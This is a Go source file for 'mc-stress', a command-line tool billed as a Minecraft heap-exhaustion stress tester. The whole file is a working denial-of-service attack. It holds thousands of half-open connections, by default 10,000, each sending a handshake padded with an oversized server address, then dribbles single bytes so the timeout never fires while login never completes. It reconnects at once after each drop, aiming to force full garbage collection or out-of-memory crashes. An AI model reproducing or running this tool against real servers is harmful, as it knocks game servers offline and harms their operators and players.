package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/spf13/cobra"
)

var (
	activeConns  atomic.Int64
	bytesSent    atomic.Int64
	droppedConns atomic.Int64
	newConns     atomic.Int64

	version = "dev"
	commit  = "none"
	date    = "unknown"
)

func writeVarInt(buf []byte, v int) []byte {
	for {
		b := byte(v & 0x7F)
		v >>= 7
		if v != 0 {
			b |= 0x80
		}
		buf = append(buf, b)
		if v == 0 {
			break
		}
	}
	return buf
}

func writeString(buf []byte, s string) []byte {
	raw := []byte(s)
	buf = writeVarInt(buf, len(raw))
	return append(buf, raw...)
}

// buildHandshake constructs a Minecraft 1.20.1 handshake packet (0x00) with
// a deliberately oversized server address string to bloat the JVM heap.
func buildHandshake(host string, port uint16) []byte {
	var payload []byte
	payload = writeVarInt(payload, 0x00) // packet ID: Handshake
	payload = writeVarInt(payload, 764)  // protocol version: 1.20.1
	payload = writeString(payload, host)
	portBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(portBuf, port)
	payload = append(payload, portBuf...)
	payload = writeVarInt(payload, 2) // next state: Login (forces more server-side allocation)

	var out []byte
	out = writeVarInt(out, len(payload))
	return append(out, payload...)
}

func randString(rng *rand.Rand, n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func holdConn(conn net.Conn, interval time.Duration, verbose bool) {
	defer conn.Close()
	defer activeConns.Add(-1)

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for range ticker.C {
		// Single byte keeps Netty's ReadTimeoutHandler from firing while
		// preventing the login sequence from completing.
		_, err := conn.Write([]byte{0x00})
		if err != nil {
			droppedConns.Add(1)
			if verbose {
				fmt.Fprintf(os.Stderr, "\ndribble error: %v\n", err)
			}
			return
		}
		bytesSent.Add(1)
	}
}

func worker(target string, port uint16, bloatSize int, dribbleInterval time.Duration, verbose bool, seed int64) {
	rng := rand.New(rand.NewSource(seed))

	for {
		host := randString(rng, bloatSize)
		handshake := buildHandshake(host, port)

		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
		if err != nil {
			if verbose {
				fmt.Fprintf(os.Stderr, "\ndial: %v\n", err)
			}
			droppedConns.Add(1)
			time.Sleep(500 * time.Millisecond)
			continue
		}

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write(handshake)
		conn.SetWriteDeadline(time.Time{})
		if err != nil {
			conn.Close()
			if verbose {
				fmt.Fprintf(os.Stderr, "\nhandshake: %v\n", err)
			}
			droppedConns.Add(1)
			continue
		}

		bytesSent.Add(int64(len(handshake)))
		activeConns.Add(1)
		newConns.Add(1)

		holdConn(conn, dribbleInterval, verbose)
		// Loop: reconnect immediately after the connection is dropped.
	}
}

func startReporter() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for range ticker.C {
		active := activeConns.Load()
		dropped := droppedConns.Load()
		sent := bytesSent.Load()
		rate := newConns.Swap(0)

		fmt.Printf("\r\033[K[%s] Active: %6d | New/s: %4d | Dropped: %6d | Sent: %s",
			time.Now().Format("15:04:05"),
			active, rate, dropped, fmtBytes(sent),
		)
	}
}

func fmtBytes(n int64) string {
	switch {
	case n >= 1<<30:
		return fmt.Sprintf("%.2fGB", float64(n)/(1<<30))
	case n >= 1<<20:
		return fmt.Sprintf("%.2fMB", float64(n)/(1<<20))
	case n >= 1<<10:
		return fmt.Sprintf("%.2fKB", float64(n)/(1<<10))
	default:
		return fmt.Sprintf("%dB", n)
	}
}

var rootCmd = &cobra.Command{
	Use:     "mc-stress <ip:port>",
	Version: fmt.Sprintf("%s (commit: %s, date: %s)", version, commit, date),
	Short:   "Minecraft G1GC heap-exhaustion stress tester",
	Long: `Holds thousands of half-open Minecraft connections to force G1GC object
promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		target := args[0]

		_, portStr, err := net.SplitHostPort(target)
		if err != nil {
			return fmt.Errorf("invalid target %q: %w", target, err)
		}
		portNum, err := strconv.ParseUint(portStr, 10, 16)
		if err != nil {
			return fmt.Errorf("invalid port: %w", err)
		}
		port := uint16(portNum)

		workers, _ := cmd.Flags().GetInt("workers")
		bloatSize, _ := cmd.Flags().GetInt("bloat-size")
		dribble, _ := cmd.Flags().GetDuration("dribble-interval")
		verbose, _ := cmd.Flags().GetBool("verbose")

		if bloatSize > 255 {
			return fmt.Errorf("--bloat-size max is 255 (Minecraft protocol limit)")
		}

		fmt.Printf("mc-stress  target=%s  workers=%d  bloat=%d  dribble=%s\n\n",
			target, workers, bloatSize, dribble)

		go startReporter()

		for i := 0; i < workers; i++ {
			go worker(target, port, bloatSize, dribble, verbose, time.Now().UnixNano()+int64(i))
		}

		select {} // block main goroutine forever
	},
}

func init() {
	f := rootCmd.Flags()
	f.IntP("workers", "w", 10000, "concurrent connections to maintain")
	f.IntP("bloat-size", "s", 255, "handshake server-address string length (max 255)")
	f.DurationP("dribble-interval", "d", 5*time.Second, "interval between keep-alive bytes")
	f.BoolP("verbose", "v", false, "print per-connection TCP errors")
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
